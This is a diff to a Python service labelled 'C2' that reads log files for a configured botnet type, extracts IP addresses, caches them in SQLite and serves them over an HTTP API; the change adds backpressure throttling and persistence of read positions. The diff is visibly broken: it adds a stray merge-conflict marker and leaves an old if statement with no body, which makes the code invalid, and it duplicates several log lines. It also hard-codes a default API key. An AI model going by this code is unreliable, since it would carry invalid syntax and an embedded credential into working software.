@@ -70,9 +70,11 @@ HTTP_PORT = int(os.environ.get("C2_HTTP_PORT", CONFIG.get("http_server", {}).get
 API_KEY = os.environ.get("C2_API_KEY", CONFIG.get("http_server", {}).get("api_key", "KiypG4zWLXqnREqGPH8L2Oh9ybvi6Yh4"))
 
 # 数据缓存配置（改用SQLite持久化）
-MAX_CACHED_RECORDS = 10000
-CACHE_DB_FILE = "/tmp/c2_data_cache.db"  # SQLite数据库文件
-CACHE_RETENTION_DAYS = 7  # 已拉取数据保留7天后自动清理
+CACHE_CONFIG = CONFIG.get("cache", {})
+MAX_CACHED_RECORDS = CACHE_CONFIG.get("max_cached_records", 10000)
+CACHE_DB_FILE = CACHE_CONFIG.get("db_file", "/tmp/c2_data_cache.db")
+CACHE_RETENTION_DAYS = CACHE_CONFIG.get("retention_days", 7)
+
 
 # 序列ID配置（用于断点续传）
 SEQ_ID_START = 1  # 序列ID起始值
@@ -80,7 +82,127 @@ SEQ_ID_START = 1  # 序列ID起始值
 # IP解析正则
 IP_REGEX = re.compile(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b')
 
+class BackpressureController:
+    """
+    背压控制器 - 根据缓存量动态调整读取行为
+    
+    策略：
+    1. 缓存 >= 高水位线 → 暂停读取（返回0）
+    2. 缓存 <= 低水位线 → 全速读取（返回max_batch）
+    3. 缓存在中间       → 线性缩放读取量
+    """
+    
+    def __init__(self, config: Dict):
+        """
+        Args:
+            config: 配置字典，包含：
+                - max_cached_records: 最大缓存记录数（硬限制）
+                - high_watermark: 高水位线（暂停读取阈值）
+                - low_watermark: 低水位线（全速读取阈值）
+                - read_batch_size: 基础读取批量大小
+                - adaptive_read: 是否启用自适应读取（默认True）
+        """
+        self.max_cached = config.get('max_cached_records', 10000)
+        self.high_watermark = config.get('high_watermark', int(self.max_cached * 0.8))
+        self.low_watermark = config.get('low_watermark', int(self.max_cached * 0.2))
+        self.read_batch_size = config.get('read_batch_size', 5000)
+        self.adaptive_read = config.get('adaptive_read', True)
+        
+        # 统计信息
+        self.total_paused = 0
+        self.total_throttled = 0
+        self.total_full_speed = 0
+        
+        logger.info(f"背压控制器初始化:")
+        logger.info(f"  - 最大缓存: {self.max_cached} 条")
+        logger.info(f"  - 高水位线: {self.high_watermark} 条 ({self.high_watermark/self.max_cached*100:.0f}%)")
+        logger.info(f"  - 低水位线: {self.low_watermark} 条 ({self.low_watermark/self.max_cached*100:.0f}%)")
+        logger.info(f"  - 基础读取量: {self.read_batch_size} 条")
+        logger.info(f"  - 自适应模式: {'启用' if self.adaptive_read else '禁用'}")
+    
+    def calculate_read_size(self, current_cached: int) -> Tuple[int, str]:
+        """
+        计算本次应该读取的记录数
+        
+        Args:
+            current_cached: 当前缓存的记录数
+        
+        Returns:
+            (read_size, reason) - 读取数量和原因
+        """
+        if not self.adaptive_read:
+            # 简单模式：超过最大值就不读
+            if current_cached >= self.max_cached:
+                self.total_paused += 1
+                return 0, f"缓存已满({current_cached}/{self.max_cached})"
+            else:
+                self.total_full_speed += 1
+                return self.read_batch_size, "正常读取"
+        
+        # 自适应模式
+        if current_cached >= self.high_watermark:
+            # 高水位：暂停读取
+            self.total_paused += 1
+            return 0, f"背压暂停({current_cached}/{self.high_watermark})"
+        
+        elif current_cached <= self.low_watermark:
+            # 低水位：全速读取
+            self.total_full_speed += 1
+            return self.read_batch_size, f"全速读取({current_cached}/{self.low_watermark})"
+        
+        else:
+            # 中间水位：线性缩放
+            # 计算缩放因子：从低水位的100%到高水位的0%
+            available_range = self.high_watermark - self.low_watermark
+            current_offset = current_cached - self.low_watermark
+            scale_factor = 1.0 - (current_offset / available_range)
+            
+            read_size = int(self.read_batch_size * scale_factor)
+            read_size = max(100, read_size)  # 至少读100条
+            
+            self.total_throttled += 1
+            return read_size, f"节流读取(缓存{current_cached}条,速度{scale_factor*100:.0f}%)"
+    
+    def should_skip_read(self, current_cached: int) -> Tuple[bool, str]:
+        """
+        判断是否应该跳过本次读取
+        
+        Returns:
+            (should_skip, reason)
+        """
+        read_size, reason = self.calculate_read_size(current_cached)
+        return read_size == 0, reason
+    
+    def get_stats(self) -> Dict:
+        """获取统计信息"""
+        total_decisions = self.total_paused + self.total_throttled + self.total_full_speed
+        
+        if total_decisions == 0:
+            return {
+                'total_decisions': 0,
+                'paused_rate': '0%',
+                'throttled_rate': '0%',
+                'full_speed_rate': '0%'
+            }
+        
+        return {
+            'total_decisions': total_decisions,
+            'paused_count': self.total_paused,
+            'throttled_count': self.total_throttled,
+            'full_speed_count': self.total_full_speed,
+            'paused_rate': f"{self.total_paused/total_decisions*100:.1f}%",
+            'throttled_rate': f"{self.total_throttled/total_decisions*100:.1f}%",
+            'full_speed_rate': f"{self.total_full_speed/total_decisions*100:.1f}%"
+        }
+    
+    def log_stats(self):
+        """输出统计信息"""
+        stats = self.get_stats()
+        if stats['total_decisions'] > 0:
+            logger.info(f"📊 背压统计: 暂停{stats['paused_rate']}, 节流{stats['throttled_rate']}, 全速{stats['full_speed_rate']}")
+
 # ============================================================
+>>>>>>> 46b5376133a7f5b130f40fc59c24a04ef65bf9d4
 # 通用工具类
 # ============================================================
 
@@ -383,6 +505,7 @@ class DataCache:
         """添加新记录（使用批量插入，自动分配seq_id）"""
         try:
             added_count = 0
+            duplicate_count = 0
             for record in records:
                 try:
                     # 自动分配seq_id
@@ -400,11 +523,16 @@ class DataCache:
                 except sqlite3.IntegrityError:
                     # 重复记录，跳过（但seq_id已增加，保证单调）
                     pass
+                    duplicate_count += 1
             
             self.conn.commit()
             self.total_generated += added_count
             self.save_stats()
-            
+
+            # 输出统计信息
+            if duplicate_count > 0:
+                logger.info(f"数据写入: 新增 {added_count} 条，重复 {duplicate_count} 条")
+
             # 检查是否超过最大缓存，如果超过则警告
             cursor = self.conn.execute('SELECT COUNT(*) as count FROM cache WHERE pulled = 0')
             unpulled_count = cursor.fetchone()['count']
@@ -555,12 +683,7 @@ class DataCache:
 # 全局数据缓存
 data_cache = DataCache()
 
-# ============================================================
-# 后台日志读取任务
-# ============================================================
-
 class BackgroundLogReader:
-    """后台日志读取器"""
     
     def __init__(self, cache: DataCache):
         self.cache = cache
@@ -569,6 +692,18 @@ class BackgroundLogReader:
         self.running = False
         self.read_interval = 60
         self.file_positions = {}  # {file_path: last_read_position}
+        # 文件位置持久化文件
+        self.positions_file = '/tmp/c2_file_positions.json'
+        self.file_positions = self._load_file_positions()
+        
+        # 从配置读取参数
+        processing_config = CONFIG.get('processing', {})
+        self.read_interval = processing_config.get('read_interval', 60)
+        self.max_files_per_read = processing_config.get('max_files_per_read', 10)
+        
+        # 初始化背压控制器
+        self.backpressure = BackpressureController(CACHE_CONFIG)
+        self.stats_counter = 0  # 用于定期输出统计
         
         # 加载回溯配置
         try:
@@ -583,6 +718,29 @@ class BackgroundLogReader:
         logger.info(f"  - 日志目录: {LOG_DIR}")
         logger.info(f"  - 文件模式: {LOG_FILE_PATTERN}")
         logger.info(f"  - 僵尸网络: {BOTNET_TYPE}")
+        logger.info(f"  - 读取间隔: {self.read_interval}秒")
+        logger.info(f"  - 位置记录: {len(self.file_positions)} 个文件")
+    
+    def _load_file_positions(self) -> Dict[str, int]:
+        """从文件加载已读取位置"""
+        try:
+            if os.path.exists(self.positions_file):
+                with open(self.positions_file, 'r') as f:
+                    positions = json.load(f)
+                    logger.info(f"已加载 {len(positions)} 个文件的读取位置")
+                    return positions
+        except Exception as e:
+            logger.warning(f"加载文件位置失败: {e}，将从头开始读取")
+        return {}
+    
+    def _save_file_positions(self):
+        """保存文件读取位置"""
+        try:
+            with open(self.positions_file, 'w') as f:
+                json.dump(self.file_positions, f, indent=2)
+            logger.debug(f"已保存 {len(self.file_positions)} 个文件的读取位置")
+        except Exception as e:
+            logger.error(f"保存文件位置失败: {e}")
     
     async def run(self):
         """运行后台读取任务"""
@@ -598,8 +756,23 @@ class BackgroundLogReader:
                 await asyncio.sleep(10)
     
     async def read_logs(self):
-        """读取日志文件（支持无限回溯+增量读取）"""
+        """读取日志文件（支持无限回溯+增量读取+背压控制）"""
         try:
+            # ========== 背压控制检查 ==========
+            stats = self.cache.get_stats()
+            current_cached = stats['cached_records']
+            
+            # 检查是否应该跳过读取
+            should_skip, reason = self.backpressure.should_skip_read(current_cached)
+            
+            if should_skip:
+                logger.info(f"⏸️  跳过本次读取: {reason}")
+                return
+            
+            # 计算本次应该读取的数量
+            read_limit, read_reason = self.backpressure.calculate_read_size(current_cached)
+            logger.info(f"📖 开始读取: {read_reason}, 限制 {read_limit} 条")
+
             # 确定回溯天数
             if self.lookback_config['mode'] == 'unlimited':
                 days_back = None  # 无限回溯
@@ -633,13 +806,22 @@ class BackgroundLogReader:
                 logger.info(f"读取日志文件: {file_path.name} (从位置 {last_position} 继续)")
                 
                 try:
+                    file_size = file_path.stat().st_size
+                    
+                    # 检查文件是否已读完
+                    if last_position >= file_size and file_size > 0:
+                        logger.debug(f"  文件已读完，跳过: {file_path.name}")
+                        files_read += 1
+                        continue
+
                     async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                         # 跳到上次读取的位置
                         await f.seek(last_position)
                         
                         line_count = 0
                         ip_count = 0
-                        
+                        file_exhausted = False  # 标记文件是否读完
+
                         async for line in f:
                             line_count += 1
                             line = line.strip()
@@ -652,10 +834,16 @@ class BackgroundLogReader:
                             if ip_data:
                                 new_records.append(ip_data)
                                 ip_count += 1
-                            
                             # 限制单次读取量，避免内存占用过多
                             if len(new_records) >= 5000:
                                 break
+                            # 使用背压控制器计算的限制量
+                            if len(new_records) >= read_limit:
+                                logger.debug(f"  达到读取限制({read_limit}条)，中断当前文件")
+                                break
+                        else:
+                            # 正常遍历结束（没有break），说明文件读完了
+                            file_exhausted = True
                         
                         # 保存当前读取位置
                         current_position = await f.tell()
@@ -663,13 +851,23 @@ class BackgroundLogReader:
                         
                         if line_count > 0:
                             logger.info(f"  文件处理: 新读{line_count}行，提取{ip_count}个IP，位置:{last_position}→{current_position}")
+                            status = "读完" if file_exhausted else "未完"
+                            logger.info(f"  文件处理: 新读{line_count}行，提取{ip_count}个IP，位置:{last_position}→{current_position} [{status}]")
                         else:
                             logger.debug(f"  文件无新内容: {file_path.name}")
                     
                     files_read += 1
-                    
+
                     # 限制单次处理的文件数
                     if files_read >= 10 or len(new_records) >= 5000:
+                    # 达到读取限制时停止
+                    if len(new_records) >= read_limit:
+                        logger.info(f"达到读取限制: 已读{files_read}个文件，提取{len(new_records)}条")
+                        break
+                    
+                    # 达到文件数限制时停止
+                    if files_read >= self.max_files_per_read:
+                        logger.info(f"达到文件数限制: 已读{files_read}个文件")
                         break
                 
                 except Exception as e:
@@ -680,11 +878,24 @@ class BackgroundLogReader:
                 self.cache.add_records(new_records)
                 stats = self.cache.get_stats()
                 logger.info(f"新增 {len(new_records)} 条记录，当前缓存: {stats['cached_records']} 条")
+                new_stats = self.cache.get_stats()
+                logger.info(f"📦 提取 {len(new_records)} 条 → 当前缓存: {new_stats['cached_records']} 条")
+                
+                # 保存文件位置
+                self._save_file_positions()
+                
+                # 每10次输出一次背压统计
+                self.stats_counter += 1
+                if self.stats_counter % 10 == 0:
+                    self.backpressure.log_stats()
+            else:
+                logger.debug("本次未提取到新数据")
             
             # 清理过期的文件位置记录（保留最近30天的）
             if len(self.file_positions) > 100:
                 recent_file_keys = {str(f[1]) for f in log_files[-100:]}
                 self.file_positions = {k: v for k, v in self.file_positions.items() if k in recent_file_keys}
+                self._save_file_positions()
         
         except Exception as e:
             logger.error(f"读取日志失败: {e}", exc_info=True)
@@ -800,8 +1011,12 @@ async def handle_confirm(request: web.Request) -> web.Response:
 
 
 async def handle_stats(request: web.Request) -> web.Response:
-    """处理统计请求"""
+    """处理统计请求（包含背压统计）"""
     stats = data_cache.get_stats()
+    
+    # 添加背压统计
+    if background_reader and background_reader.backpressure:
+        stats['backpressure_stats'] = background_reader.backpressure.get_stats()
     return web.json_response(stats)
 
 
